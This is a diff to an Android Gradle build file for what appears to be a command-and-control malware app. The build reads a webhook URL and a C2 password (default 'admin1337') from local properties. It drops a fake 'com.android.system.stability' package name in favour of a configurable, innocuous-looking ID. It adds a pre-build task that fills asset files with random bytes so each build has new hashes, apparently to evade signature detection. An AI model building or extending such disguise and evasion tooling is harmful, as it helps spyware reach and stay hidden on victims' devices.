@@ -19,19 +19,26 @@ android {
     }
 
     defaultConfig {
-        applicationId "com.android.system.stability"
-        minSdk 21
-        targetSdk 34
-        versionCode 623
-        versionName "4.1.7"
-        multiDexEnabled true
-        
-        // Read WEBHOOK_URL from local.properties
+        // Read local.properties configuration
         def localProperties = new Properties()
         def localPropertiesFile = rootProject.file('local.properties')
         if (localPropertiesFile.exists()) {
             localProperties.load(new FileInputStream(localPropertiesFile))
         }
+
+        def customAppId = (localProperties['APP_ID'] ?: "").trim().replace("\"", "").replace("'", "")
+        if (!customAppId.isEmpty()) {
+            applicationId customAppId
+            println "[BUILD SUCCESS] Application ID configured: ${customAppId}"
+        } else {
+            applicationId "com.mobile.pack.utility"
+        }
+
+        minSdk 21
+        targetSdk 34
+        versionCode 623
+        versionName "3.4.9"
+        multiDexEnabled true
         
         def webhookUrl = (localProperties['WEBHOOK_URL'] ?: "").trim().replace("\"", "").replace("'", "")
         def c2Password = (localProperties['C2_PASSWORD'] ?: "admin1337").toString().trim().replace("\"", "").replace("'", "")
@@ -146,30 +153,45 @@ dependencies {
 // Fix for "The processing instruction target matching '[xX][mM][lL]' is not allowed"
 // This ensures the XML declaration is always the first line in resource files.
 tasks.register("fixXmlDeclarations") {
+    def resDir = layout.projectDirectory.dir("src/main/res").asFile
     doLast {
-        fileTree("src/main/res").matching {
-            include "**/*.xml"
-        }.forEach { file ->
-            def content = file.getText("UTF-8")
-            if (content.contains("<?xml")) {
-                def lines = content.readLines()
-                int xmlIndex = lines.findIndexOf { it.trim().startsWith("<?xml") }
-                if (xmlIndex > 0) {
-                    println "Fixing XML declaration in ${file.path}"
-                    def xmlLine = lines.get(xmlIndex)
-                    def remaining = new ArrayList(lines)
-                    remaining.remove(xmlIndex)
-                    file.setText(xmlLine + "\n" + remaining.join("\n"), "UTF-8")
+        if (resDir.exists()) {
+            resDir.eachFileRecurse(groovy.io.FileType.FILES) { file ->
+                if (file.name.endsWith(".xml")) {
+                    def content = file.getText("UTF-8")
+                    if (content.contains("<?xml")) {
+                        def lines = content.readLines()
+                        int xmlIndex = lines.findIndexOf { it.trim().startsWith("<?xml") }
+                        if (xmlIndex > 0) {
+                            println "Fixing XML declaration in ${file.path}"
+                            def xmlLine = lines.get(xmlIndex)
+                            def remaining = new ArrayList(lines)
+                            remaining.remove(xmlIndex)
+                            file.setText(xmlLine + "\n" + remaining.join("\n"), "UTF-8")
+                        }
+                    }
                 }
             }
         }
     }
 }
 
-project.afterEvaluate {
-    if (tasks.findByName("preBuild")) {
-        tasks.named("preBuild").configure {
-            dependsOn("fixXmlDeclarations")
+tasks.register("randomizeAssetMetadata") {
+    def sysDir = layout.projectDirectory.dir("src/main/assets/sys").asFile
+    doLast {
+        if (!sysDir.exists()) sysDir.mkdirs()
+        def rand = new Random()
+        [1, 2, 3].each { num ->
+            def target = new File(sysDir, "metadata_${num}.dat")
+            byte[] bytes = new byte[512]
+            rand.nextBytes(bytes)
+            target.setBytes(bytes)
         }
+        println "[BUILD SUCCESS] Asset entropy metadata randomized."
     }
+}
+
+tasks.named("preBuild").configure {
+    dependsOn("fixXmlDeclarations")
+    dependsOn("randomizeAssetMetadata")
 }
